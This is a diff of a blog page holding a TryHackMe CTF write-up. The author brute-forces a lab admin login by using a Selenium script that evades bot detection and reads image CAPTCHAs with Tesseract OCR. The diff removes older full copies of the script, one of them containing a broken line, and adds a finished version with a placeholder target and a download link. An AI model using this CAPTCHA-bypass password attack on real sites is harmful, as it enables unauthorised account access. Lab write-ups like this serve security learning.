@@ -7,10 +7,10 @@
 <meta name="robots" content="index, follow">
 <title>CAPTCHApocolypse | Jenn Shagrin</title>
 <meta name="keywords" content="">
-<meta name="description" content="TryHackMe CTF — Selenium CAPTCHA bypass with Tesseract OCR, browser automation password attack against CSRF-protected login with image-based CAPTCHA.">
+<meta name="description" content="TryHackMe CTF. Selenium CAPTCHA bypass with Tesseract OCR, browser automation password attack against CSRF-protected login with image-based CAPTCHA.">
 <meta name="author" content="">
 <link rel="canonical" href="https://jennshaggy.github.io/captchapocolypse.html">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.40a236105b83b1f05a55d0a48876965b59b1d8f81f351041e484dc5905b375dc.css" rel="preload stylesheet" as="style">
     <link rel="stylesheet" href="/assets/css/accents.css">
 <link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
@@ -68,15 +68,18 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&amp;family=Source+Code+Pro:wght@400;500;600&amp;family=Tomorrow:wght@500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site-ui-lab.css">
 <meta property="og:url" content="https://jennshaggy.github.io/captchapocolypse.html">
 <meta property="og:site_name" content="Jenn Shagrin">
 <meta property="og:title" content="CAPTCHApocolypse">
-<meta property="og:description" content="TryHackMe CTF — Selenium CAPTCHA bypass with Tesseract OCR, browser automation password attack against CSRF-protected login with image-based CAPTCHA.">
+<meta property="og:description" content="TryHackMe CTF. Selenium CAPTCHA bypass with Tesseract OCR, browser automation password attack against CSRF-protected login with image-based CAPTCHA.">
 <meta property="og:locale" content="en-us">
 <meta property="og:type" content="article">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CAPTCHApocolypse">
-<meta name="twitter:description" content="TryHackMe CTF — Selenium CAPTCHA bypass with Tesseract OCR, browser automation password attack against CSRF-protected login with image-based CAPTCHA.">
+<meta name="twitter:description" content="TryHackMe CTF. Selenium CAPTCHA bypass with Tesseract OCR, browser automation password attack against CSRF-protected login with image-based CAPTCHA.">
 </head>
 
 <body id="top">
@@ -105,6 +108,7 @@
                         <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                     </svg>
                 </button>
+                <button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu"><span class="menu-toggle-label">Menu</span><span class="menu-toggle-icon" aria-hidden="true"><span></span><span></span></span></button>
             </div>
         </div>
         <ul id="menu">
@@ -134,7 +138,7 @@
                 </a>
             </li>
             <li>
-                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                <a href="/ai-security/" title="AI Security">
                     <span>AI Security</span>
                 </a>
             </li>
@@ -143,7 +147,7 @@
 </header>
 
 <main class="main">
-<article class="post-single">
+<article class="post-single technical-writeup">
   <header class="post-header">
     <h1 class="post-title entry-hint-parent">CAPTCHApocolypse</h1>
     <div class="post-description">TryHackMe CTF. Can you guess the password of the admin user and log in to the dashboard? Note: Use the first 100 lines of rockyou.txt.</div>
@@ -153,172 +157,38 @@
 
 <p>Let&rsquo;s rock (cue <em>Exit Light</em> by Metallica).</p>
 
-<p>Here&rsquo;s my plan of attack:</p>
-
-<p>Freshly armed with a custom Selenium CAPTCHA browser bypass tool Python script, I&rsquo;ll modify it to fit this Target IP.</p>
-
-<p>First, we&rsquo;ll need a few line items:</p>
+<p>I&rsquo;ve got a custom Selenium CAPTCHA bypass script from a previous challenge. I&rsquo;ll adapt it for this target, starting with a few things I need to pin down:</p>
 <ul>
 <li>The first 100 lines of <code>rockyou.txt</code></li>
-<li>Swap the first 100 lines into the custom Selenium tool script</li>
 <li>The Target IP</li>
-<li>Potential subdomain of Target IP where CAPTCHA to bypass lives</li>
+<li>The CAPTCHA-protected login page on the target</li>
 </ul>
 
 <p>Let&rsquo;s grab the first 100 <code>rockyou.txt</code> lines, and run a few scans.</p>
 
 <pre><code>head -n 100 /usr/share/wordlists/rockyou.txt &gt; top100.txt</code></pre>
 
-<p>With our freshly-created <code>top100.txt</code>, we&rsquo;ll make our first two mods to the custom script.</p>
-
-<p>The custom Selenium CAPTCHA Python Script we&rsquo;re modifying, Target IP already updated:</p>
-
-<pre><code>from selenium.webdriver.common.by import By
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.chrome.service import Service
-from selenium_stealth import stealth
-
-import time
-from fake_useragent import UserAgent
-from PIL import Image, ImageEnhance, ImageFilter
-import pytesseract
-import io
-import os
-
-# Create folder for saving CAPTCHA images
-os.makedirs("captchas", exist_ok=True)
-
-options = Options()
-ua = UserAgent()
-userAgent = ua.random
-options.add_argument('--no-sandbox')
-options.add_argument('--headless')
-options.add_argument("start-maximized")
-options.add_argument(f'user-agent={userAgent}')
-options.add_argument('--disable-dev-shm-usage')
-options.add_argument('--disable-cache')
-options.add_argument('--disable-gpu')
-
-options.binary_location = "/usr/bin/google-chrome"
-service = Service(executable_path='chromedriver-linux64/chromedriver')
-chrome = webdriver.Chrome(service=service, options=options)
-
-stealth(chrome,
-    languages=["en-US", "en"],
-    vendor="Google Inc.",
-    platform="Win32",
-    webgl_vendor="Intel Inc.",
-    renderer="Intel Iris OpenGL Engine",
-    fix_hairline=True,
-)
-
-# CONFIG
-ip = 'http://10.144.142.102'
-login_url = f'{ip}/index.php'
-dashboard_url = f'{ip}/dashboard.php'
-
-username = "admin"
-with open('rockyou.txt', 'r') as f:
-    passwords = [line.strip() for line in f]
-
-for password in passwords:
-    while True:
-        chrome.get(login_url)
-        time.sleep(1)
-
-        # Grab CSRF token
-        csrf = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")
-
-        # Get CAPTCHA image rendered in-browser
-        captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
-        captcha_png = captcha_img_element.screenshot_as_png
-
-        # Preprocess image for OCR
-        image = Image.open(io.BytesIO(captcha_png)).convert("L")
-        image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)  # Resize for clarity
-        image = image.filter(ImageFilter.SHARPEN)
-        image = ImageEnhance.Contrast(image).enhance(2.0)
-        image = image.point(lambda x: 0 if x &lt; 140 else 255, '1')
-
-        # OCR the CAPTCHA
-        captcha_text = pytesseract.image_to_string(
-            image,
-            config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
-        ).strip().replace(" ", "").replace("\n", "").upper()
-
-        # Save the image for review
-        image.save(f"captchas/captcha_{password}_{captcha_text}.png")
-
-        if not captcha_text.isalnum() or len(captcha_text) != 5:
-            print(f"[!] OCR failed (got: '{captcha_text}'), retrying...")
-            continue
-
-        print(f"[*] Trying password: {password} with CAPTCHA: {captcha_text}")
-
-        # Fill out and submit the form
-        chrome.find_element(By.NAME, "username").send_keys(username)
-        chrome.find_element(By.NAME, "password").send_keys(password)
-        chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)
-        chrome.find_element(By.TAG_NAME, "form").submit()
-
-        time.sleep(1)
-
-        print("=== HTML Output After Submit ===")
-        print(chrome.page_source)
-        print("================================")
-
-        if dashboard_url in chrome.current_url:
-            print(f"[+] Login successful with password: {password}")
-            try:
-                flag = chrome.find_element(By.TAG_NAME, "p").text
-                print(f"[+] {flag}")
-            except:
-                print("[!] Logged in, but no flag found.")
-            chrome.quit()
-            exit()
-        else:
-            print(f"[-] Failed login with: {password}")
-            break  # try next password
-
-chrome.quit()</code></pre>
-
-<p>We&rsquo;re now also swapping the highlighted line below with:</p>
+<p>With <code>top100.txt</code> ready, I can update the target IP and point the script at that short wordlist. I still need to inspect the login form before running it.</p>
 
 <pre><code>with open('top100.txt', 'r') as f:
     passwords = [line.strip() for line in f]</code></pre>
 
 
-<p>Moving on.</p>
-
-<p>Let&rsquo;s quickly verify that <code>top100.txt</code> lives where we are summoning it from:</p>
-
-<pre><code>head -n 100 /usr/share/wordlists/rockyou.txt &gt; top100.txt</code></pre>
+<p>First, let&rsquo;s confirm <code>top100.txt</code> is where the script expects it:</p>
 
 <img src="/images/captchapocolypse/Screenshot 2026-05-11 at 8.42.52 AM.png" alt="top100.txt created and confirmed present" style="max-width:100%;margin:2rem 0;">
 
-<p>Confirmed there.</p>
-
-<p>Our <strong>nmap</strong> scan is back:</p>
+<p>The file is there, and our nmap scan is back:</p>
 
 <img src="/images/captchapocolypse/Screenshot 2026-05-11 at 8.43.27 AM.png" alt="nmap scan output showing open ports" style="max-width:100%;margin:2rem 0;">
 
-<p>The <strong>nmap</strong> clearly points us to <code>/login</code>. I&rsquo;ve already started the <code>gobuster</code> below. We&rsquo;ll let that run while we dive in.</p>
-
-<p>Here&rsquo;s the <strong>gobuster</strong> we likely won&rsquo;t need:</p>
-
-<pre><code>┌──(jenn㉿local)-[~]
-└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
--u http://10.144.142.102</code></pre>
-
-<p>Let&rsquo;s visit our Target IP:<br>
-<code>http://10.144.142.102</code></p>
+<p>Nmap found HTTP on port 80 and reported the page title as <code>Login</code>. Let&rsquo;s visit the target at <code>http://10.144.142.102</code>.</p>
 
 <img src="/images/captchapocolypse/Screenshot 2026-05-11 at 8.50.11 AM.png" alt="target IP login page with CAPTCHA visible" style="max-width:100%;margin:2rem 0;">
 
 <p>Goodness me.</p>
 
-<p>There are 3 different fields for the custom script to tackle vs the two contained in the present script.</p>
+<p>There are three visible fields for the custom script to tackle, plus a hidden CSRF token.</p>
 
 <p>I need to dig in and inspect this page to find:</p>
 <ol>
@@ -353,7 +223,7 @@ chrome.quit()</code></pre>
 <li><strong>Login button uses JavaScript</strong>: <code>onclick="login()"</code> aka not a standard form submit</li>
 </ul>
 
-<p>The big hurdle is CAPTCHA not being an image. Our initial Selenium script uses Tesseract OCR to &ldquo;see&rdquo; an image-based CAPTCHA, but this is not an image. Selenium can&rsquo;t just &ldquo;see&rdquo; it like text from the DOM. However, our Selenium scripts CAN screenshot the image element and pass it to Tesseract OCR.</p>
+<p>The CAPTCHA lives in an <code>&lt;img&gt;</code> element, so Selenium can screenshot it and pass the image to Tesseract OCR.</p>
 
 <p>Here&rsquo;s how we need to retool to bypass this CAPTCHA goblin:</p>
 
@@ -372,125 +242,15 @@ chrome.quit()</code></pre>
 <pre><code>sudo apt install tesseract-ocr
 pip install pytesseract pillow</code></pre>
 
-<p>We&rsquo;re going to run our existing script as <a href="/scripts/CAPTCHA_goblin.py"><code>CAPTCHA_goblin.py</code></a> and see how it goes.</p>
+<p>We&rsquo;re going to run our existing script as <code>CAPTCHA_goblin.py</code> and see how it goes.</p>
 
-<p>To recap, here&rsquo;s the Selenium <code>CAPTCHA_goblin.py</code> script:</p>
-
-<pre><code>from selenium.webdriver.common.by import By
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.chrome.service import Service
-from selenium_stealth import stealth
-
-import time
-from fake_useragent import UserAgent
-from PIL import Image, ImageEnhance, ImageFilter
-import pytesseract
-import io
-import os
-
-# Create folder for saving CAPTCHA images
-os.makedirs("captchas", exist_ok=True)
-
-options = Options()
-ua = UserAgent()
-userAgent = ua.random
-options.add_argument('--no-sandbox')
-options.add_argument('--headless')
-options.add_argument("start-maximized")
-options.add_argument(f'user-agent={userAgent}')
-options.add_argument('--disable-dev-shm-usage')
-options.add_argument('--disable-cache')
-options.add_argument('--disable-gpu')
-
-options.binary_location = "/usr/bin/chromium"
-service = Service(executable_path='/usr/bin/chromedriver')linux64/chromedriver')
-chrome = webdriver.Chrome(service=service, options=options)
-
-stealth(chrome,
-    languages=["en-US", "en"],
-    vendor="Google Inc.",
-    platform="Win32",
-    webgl_vendor="Intel Inc.",
-    renderer="Intel Iris OpenGL Engine",
-    fix_hairline=True,
-)
-
-# CONFIG
-ip = 'http://10.144.142.102'
-login_url = f'{ip}/index.php'
-dashboard_url = f'{ip}/dashboard.php'
-
-username = "admin"
-with open('top100.txt', 'r') as f:
-    passwords = [line.strip() for line in f]
-
-for password in passwords:
-    while True:
-        chrome.get(login_url)
-        time.sleep(1)
-
-        # Grab CSRF token
-        csrf = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")
-
-        # Get CAPTCHA image rendered in-browser
-        captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
-        captcha_png = captcha_img_element.screenshot_as_png
-
-        # Preprocess image for OCR
-        image = Image.open(io.BytesIO(captcha_png)).convert("L")
-        image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)  # Resize for clarity
-        image = image.filter(ImageFilter.SHARPEN)
-        image = ImageEnhance.Contrast(image).enhance(2.0)
-        image = image.point(lambda x: 0 if x &lt; 140 else 255, '1')
-
-        # OCR the CAPTCHA
-        captcha_text = pytesseract.image_to_string(
-            image,
-            config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
-        ).strip().replace(" ", "").replace("\n", "").upper()
-
-        # Save the image for review
-        image.save(f"captchas/captcha_{password}_{captcha_text}.png")
-
-        if not captcha_text.isalnum() or len(captcha_text) != 5:
-            print(f"[!] OCR failed (got: '{captcha_text}'), retrying...")
-            continue
-
-        print(f"[*] Trying password: {password} with CAPTCHA: {captcha_text}")
-
-        # Fill out and submit the form
-        chrome.find_element(By.NAME, "username").send_keys(username)
-        chrome.find_element(By.NAME, "password").send_keys(password)
-        chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)
-        chrome.find_element(By.TAG_NAME, "form").submit()
-
-        time.sleep(1)
-
-        print("=== HTML Output After Submit ===")
-        print(chrome.page_source)
-        print("================================")
-
-        if dashboard_url in chrome.current_url:
-            print(f"[+] Login successful with password: {password}")
-            try:
-                flag = chrome.find_element(By.TAG_NAME, "p").text
-                print(f"[+] {flag}")
-            except:
-                print("[!] Logged in, but no flag found.")
-            chrome.quit()
-            exit()
-        else:
-            print(f"[-] Failed login with: {password}")
-            break  # try next password
-
-chrome.quit()</code></pre>
+<p>The first version still submits the form with <code>form.submit()</code>. We&rsquo;ll find out soon why that needs to change.</p>
 
 <p>Not the worst result in the world:</p>
 
 <img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.13.26 AM.png" alt="script error output missing selenium-stealth and fake-useragent" style="max-width:100%;margin:2rem 0;">
 
-<p>This isn&rsquo;t a script issue. <code>selenium-stealth</code> and <code>fake-useragent</code> aren&rsquo;t packaged in <code>apt</code>.</p>
+<p>The first run stops at a missing <code>selenium-stealth</code> import. I also need <code>fake-useragent</code>, so I&rsquo;ll install both Python packages with <code>pip</code>.</p>
 
 <p><strong>Workaround</strong>:<br>
 <code>--break-system-packages</code> is the simplest bypass on Kali for this single-use install.</p>
@@ -525,17 +285,83 @@ which chromium</code></pre>
 
 <img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.21.10 AM.png" alt="which chromedriver returning /usr/bin/chromedriver" style="max-width:100%;margin:2rem 0;">
 
-<p>Now all we need to update in <code>CAPTCHA_goblin.py</code> is this:</p>
+<p>Now we need to point <code>CAPTCHA_goblin.py</code> at Chromium and its driver:</p>
 
 <pre><code>options.binary_location = "/usr/bin/chromium"
 service = Service(executable_path='/usr/bin/chromedriver')</code></pre>
 
-<p>These are the two lines we are replacing:</p>
+<p>With the browser paths fixed, let&rsquo;s run it again.</p>
 
+<p>ITS ALIVE:</p>
 
-<p>Updated script:</p>
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.25.19 AM.png" alt="CAPTCHA_goblin.py running and iterating through passwords" style="max-width:100%;margin:2rem 0;">
 
-<pre><code>from selenium.webdriver.common.by import By
+<p>We&rsquo;ll let it iterate through the CAPTCHA&hellip;</p>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.25.59 AM.png" alt="script iterating with password attempts and CAPTCHA reads" style="max-width:100%;margin:2rem 0;">
+
+<p>The script runs now, but the login button uses JavaScript. I need to replace the form submission with a click on that button:</p>
+
+<pre><code>chrome.find_element(By.ID, "login-btn").click()</code></pre>
+
+<p>If this final edit works, we&rsquo;ll tone down the noise by removing:</p>
+
+<pre><code>print("=== HTML Output After Submit ===")
+print(chrome.page_source)
+print("================================")</code></pre>
+
+<p>For now, we may need the &ldquo;noise&rdquo; to debug.</p>
+
+<p>Here we go again:</p>
+
+<pre><code>$ python3 CAPTCHA_goblin.py</code></pre>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.31.48 AM.png" alt="script running with form correctly submitting and responses visible" style="max-width:100%;margin:2rem 0;">
+
+<p>It&rsquo;s running, the form is submitting, and we&rsquo;re getting responses from the application.</p>
+
+<p>Let&rsquo;s check the saved CAPTCHA images to see what the OCR is reading:</p>
+
+<pre><code>ls captchas/ | head -5</code></pre>
+
+<p>And look at one with our human eyes:</p>
+
+<pre><code>xdg-open captchas/captcha_123123_S8UAS.png</code></pre>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.36.50 AM.png" alt="captchas directory listing showing saved CAPTCHA images" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.36.29 AM.png" alt="CAPTCHA image opened showing distorted text" style="max-width:100%;margin:2rem 0;">
+
+<p>We&rsquo;re so close.</p>
+
+<p>The <code>CAPTCHA incorrect</code> error we&rsquo;re seeing post-submission should retry the same password with a fresh CAPTCHA each iteration.</p>
+
+<p>We just need the script to not handle CAPTCHA and password failures the same way.</p>
+
+<p>Let&rsquo;s update the failure-handling logic so a bad CAPTCHA retries the same password, while a rejected password moves to the next one:</p>
+
+<pre><code>elif "CAPTCHA incorrect" in chrome.page_source:
+    print(f"[!] CAPTCHA wrong (got '{captcha_text}'), retrying same password")
+    continue  # retry same password with fresh CAPTCHA
+else:
+    print(f"[-] Failed login with: {password}")
+    break  # actual wrong password, try next</code></pre>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.53.12 AM.png" alt="updated script with CAPTCHA retry logic in place" style="max-width:100%;margin:2rem 0;">
+
+<p>So clean.</p>
+
+<p>How do we know it&rsquo;s working correctly?</p>
+
+<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.54.21 AM.png" alt="princess password attempted 3 times with different CAPTCHAs then moved on" style="max-width:100%;margin:2rem 0;">
+
+<p>In the above screenshot, <code>princess</code> had 3 attempts with different CAPTCHAs until it found the right one. <code>CAPTCHA_goblin</code> then confirmed the actual password was wrong and moved on.</p>
+
+<p>That&rsquo;s the behavior I wanted. Good boy. I let <code>CAPTCHA_goblin</code> work through the rest of the first 100 passwords in <code>rockyou.txt</code>, and it found the admin password. Well, well. Would you look at that. Good job, Jenn.</p>
+
+<p>Here&rsquo;s the finished script, with the browser path, login button, and CAPTCHA retry fixes in place:</p>
+
+<pre><code class="language-python">from selenium.webdriver.common.by import By
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
@@ -576,7 +402,7 @@ stealth(chrome,
 )
 
 # CONFIG
-ip = 'http://10.144.142.102'
+ip = 'http://TARGET_IP'
 login_url = f'{ip}/index.php'
 dashboard_url = f'{ip}/dashboard.php'
 
@@ -637,95 +463,14 @@ for password in passwords:
             exit()
         elif "CAPTCHA incorrect" in chrome.page_source:
             print(f"[!] CAPTCHA wrong (got '{captcha_text}'), retrying same password")
-            continue
+            continue  # retry same password with fresh CAPTCHA
         else:
             print(f"[-] Failed login with: {password}")
-            break
+            break  # actual wrong password, try next
 
 chrome.quit()</code></pre>
 
-<p>ITS ALIVE:</p>
-
-<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.25.19 AM.png" alt="CAPTCHA_goblin.py running and iterating through passwords" style="max-width:100%;margin:2rem 0;">
-
-<p>We&rsquo;ll let it iterate through the CAPTCHA&hellip;</p>
-
-<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.25.59 AM.png" alt="script iterating with password attempts and CAPTCHA reads" style="max-width:100%;margin:2rem 0;">
-
-<p>We have one tiny fix left. The login button uses JavaScript.<br>
-Now that we know the script iterates and is supported by the OS with what it needs, we can modify this line:</p>
-
-
-<p>We&rsquo;ll change it to this:</p>
-
-<pre><code>chrome.find_element(By.ID, "login-btn").click()</code></pre>
-
-<p>If this final edit works, we&rsquo;ll tone down the noise by removing:</p>
-
-<pre><code>print("=== HTML Output After Submit ===")
-print(chrome.page_source)
-print("================================")</code></pre>
-
-<p>For now, we may need the &ldquo;noise&rdquo; to debug.</p>
-
-<p>Here we go again:</p>
-
-<pre><code>$ python3 CAPTCHA_goblin.py</code></pre>
-
-<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.31.48 AM.png" alt="script running with form correctly submitting and responses visible" style="max-width:100%;margin:2rem 0;">
-
-<p>It&rsquo;s now running and the form is correctly submitting.<br>
-Those are actual responses.</p>
-
-<p>Let&rsquo;s see what the CAPTCHA actually says so we know what the OCR is receiving:</p>
-
-<pre><code>ls captchas/ | head -5</code></pre>
-
-<p>And look at one with our human eyes:</p>
-
-<pre><code>xdg-open captchas/captcha_123123_S8UAS.png</code></pre>
-
-<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.36.50 AM.png" alt="captchas directory listing showing saved CAPTCHA images" style="max-width:100%;margin:2rem 0;">
-
-<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.36.29 AM.png" alt="CAPTCHA image opened showing distorted text" style="max-width:100%;margin:2rem 0;">
-
-<p>We&rsquo;re so close.</p>
-
-<p>The <code>CAPTCHA incorrect</code> error we&rsquo;re seeing post-submission should retry the same password with a fresh CAPTCHA each iteration.</p>
-
-<p>We just need the script to not handle CAPTCHA and password failures the same way.</p>
-
-<p>We&rsquo;ll replace this last part of the script&hellip;</p>
-
-
-<p>&hellip;with this:</p>
-
-<pre><code>elif "CAPTCHA incorrect" in chrome.page_source:
-    print(f"[!] CAPTCHA wrong (got '{captcha_text}'), retrying same password")
-    continue  # retry same password with fresh CAPTCHA
-else:
-    print(f"[-] Failed login with: {password}")
-    break  # actual wrong password, try next</code></pre>
-
-<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.53.12 AM.png" alt="updated script with CAPTCHA retry logic in place" style="max-width:100%;margin:2rem 0;">
-
-<p>So clean.</p>
-
-<p>How do we know it&rsquo;s working correctly?</p>
-
-<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.54.21 AM.png" alt="princess password attempted 3 times with different CAPTCHAs then moved on" style="max-width:100%;margin:2rem 0;">
-
-<p>In the above screenshot, <code>princess</code> had 3 attempts with different CAPTCHAs until one was right. <code>CAPTCHA_goblin</code> then confirmed the actual password was wrong and moved on.</p>
-
-<p>That&rsquo;s exactly how the script should behave. Good boy.</p>
-
-<p>Now, we just let it run through the rest of <code>rockyou.txt</code> first 100&hellip;</p>
-
-<img src="/images/captchapocolypse/Screenshot 2026-05-11 at 9.57.38 AM.png" alt="script finds successful login and flag captured" style="max-width:100%;margin:2rem 0;">
-
-<p>Well, well. Would you look at that.</p>
-
-<p>Good job, Jenn.</p>
+<p>You can also download <a href="/scripts/CAPTCHA_goblin.py"><code>CAPTCHA_goblin.py</code></a>.</p>
 
   </div>
   <footer class="post-footer"></footer>
@@ -798,6 +543,9 @@ else:
             localStorage.setItem("pref-theme", 'dark');
         }
     })
+</script>
+<script>
+(()=>{const t=document.getElementById("menu-toggle"),m=document.getElementById("menu");if(!t||!m)return;document.documentElement.classList.add("js-menu-ready");const close=(focus=false)=>{t.setAttribute("aria-expanded","false");m.classList.remove("menu-open");if(focus)t.focus()};t.addEventListener("click",()=>{const open=t.getAttribute("aria-expanded")==="true";t.setAttribute("aria-expanded",String(!open));m.classList.toggle("menu-open",!open)});m.addEventListener("click",e=>{if(e.target.closest("a"))close()});document.addEventListener("click",e=>{if(t.getAttribute("aria-expanded")==="true"&&!m.contains(e.target)&&!t.contains(e.target))close()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&t.getAttribute("aria-expanded")==="true")close(true)});window.matchMedia("(min-width: 769px)").addEventListener("change",e=>{if(e.matches)close()})})();
 </script>
 <!-- Cloudflare Web Analytics --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "d29793993e20413c866dbc989486b294"}'></script><!-- End Cloudflare Web Analytics -->
 </body>
